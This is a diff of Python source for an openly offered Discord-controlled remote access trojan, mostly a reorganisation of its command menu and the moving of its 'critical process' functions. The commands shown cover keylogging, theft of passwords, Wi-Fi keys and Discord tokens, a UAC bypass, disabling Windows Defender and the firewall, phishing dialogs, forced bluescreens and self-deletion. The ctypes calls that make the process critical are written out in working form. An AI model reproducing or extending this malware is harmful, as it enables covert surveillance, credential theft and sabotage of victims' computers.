@@ -51,48 +51,48 @@ Available commands are :
 !startkeylogger = Starts a keylogger
 !stopkeylogger = Stops keylogger
 !dumpkeylogger = Dumps the keylog
+!ejectcd = eject the cd drive on computer
+!retractcd = retract the cd drive on the computer
 !volumemax = Put volume to max
 !volumezero = Put volume at 0
 !idletime = Get the idle time of user's on target computer
 !listprocess = Get all process
---> !blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
---> !unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
---> !screenshot = Get the screenshot of the user's current screen
---> !exit = Exit program
---> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
---> !uacbypass = attempt to bypass uac to gain admin by using fod helper
---> !passwords = grab all passwords
---> !streamscreen = stream screen by sending multiple pictures
---> !stopscreen = stop screen stream
---> !shutdown = shutdown computer
---> !restart = restart computer
---> !logoff = log off current user
---> !bluescreen = BlueScreen PC
---> !displaydir = display all items in current dir
---> !currentdir = display the current dir
---> !dateandtime = display system date and time
---> !prockill = kill a process by name / syntax = "!kill process.exe"
---> !recscreen = record screen for certain amount of time / syntax = "!recscreen 10"
---> !recaudio = record audio for certain amount of time / syntax = "!recaudio 10"
---> !disableantivirus = permanently disable windows defender(requires admin)
---> !disablefirewall = disable windows firewall (requires admin)
---> !audio = play a audio file on the target computer(.wav only) / Syntax = "!audio" (with attachment)
---> !selfdestruct = delete all traces that this program was on the target PC
---> !windowspass = attempt to phish password by poping up a password dialog
---> !displayoff = turn off the monitor(Admin rights are required)
---> !displayon = turn on the monitors(Admin rights are required)
---> !hide = hide the file by changing the attribute to hidden
---> !unhide = unhide the file the removing the attribute to make it unhidden
---> !ejectcd = eject the cd drive on computer
---> !retractcd = retract the cd drive on the computer
---> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)
---> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)
---> !website = open a website on the infected computer / syntax = "!website google.com" or "!website www.google.com"
---> !distaskmgr = disable task manager(Admin rights are required)
---> !enbtaskmgr = enable task manager(if disabled)(Admin rights are required)
---> !getwifipass = get all the wifi passwords on the current device(Admin rights are required)
---> !startup = add file to startup(when computer go on this file starts)(Admin rights are required)
---> !getdiscordtokens = get discord token ONLY! (also decrypts them)
+!blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
+!unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
+!screenshot = Get the screenshot of the user's current screen
+!exit = Exit program
+!kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
+!passwords = grab all passwords
+!streamscreen = stream screen by sending multiple pictures
+!uacbypass = attempt to bypass uac to gain admin by using fod helper
+!stopscreen = stop screen stream
+!shutdown = shutdown computer
+!restart = restart computer
+!logoff = log off current user
+!bluescreen = BlueScreen PC
+!displaydir = display all items in current dir
+!currentdir = display the current dir
+!dateandtime = display system date and time
+!prockill = kill a process by name / syntax = "!kill process.exe"
+!recscreen = record screen for certain amount of time / syntax = "!recscreen 10"
+!recaudio = record audio for certain amount of time / syntax = "!recaudio 10"
+!disableantivirus = permanently disable windows defender(requires admin)
+!disablefirewall = disable windows firewall (requires admin)
+!windowspass = attempt to phish password by poping up a password dialog
+!displayoff = turn off the monitor(Admin rights are required)
+!displayon = turn on the monitors(Admin rights are required)
+!audio = play a audio file on the target computer(.wav only) / Syntax = "!audio" (with attachment)
+!selfdestruct = delete all traces that this program was on the target PC
+!hide = hide the file by changing the attribute to hidden
+!unhide = unhide the file the removing the attribute to make it unhidden
+!critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)
+!uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)
+!website = open a website on the infected computer / syntax = "!website google.com" or "!website www.google.com"
+!distaskmgr = disable task manager(Admin rights are required)
+!enbtaskmgr = enable task manager(if disabled)(Admin rights are required)
+!getwifipass = get all the wifi passwords on the current device(Admin rights are required)
+!startup = add file to startup(when computer go on this file starts)(Admin rights are required)
+!getdiscordtokens = get discord token ONLY! (also decrypts them)
 """
 if not (sys.argv[0].endswith("exe")):
     helpmenu+='--> !reccam = record camera for certain amount of time / syntax = "!reccam 10"'
@@ -154,7 +154,15 @@ async def on_ready():
         await channel.send(value1)
     game = discord.Game(f"Window logging stopped")
     await client.change_presence(status=discord.Status.online, activity=game)
-    
+
+def critproc():
+    import ctypes
+    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
+    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
+
+def uncritproc():
+    import ctypes
+    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
 def volumeup():
     devices = AudioUtilities.GetSpeakers()
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
@@ -168,14 +176,6 @@ def volumedown():
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
     volume = cast(interface, POINTER(IAudioEndpointVolume))
     volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
-def critproc():
-    import ctypes
-    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
-    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
-
-def uncritproc():
-    import ctypes
-    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
 
 @client.event
 async def on_message(message):
@@ -401,6 +401,7 @@ async def on_message(message):
                 path = "rmdir " + temp + r"\history12" + " /s /q"
                 os.system(path)
             deleteme()
+            
         if message.content == "!clipboard":
             import ctypes
             import os
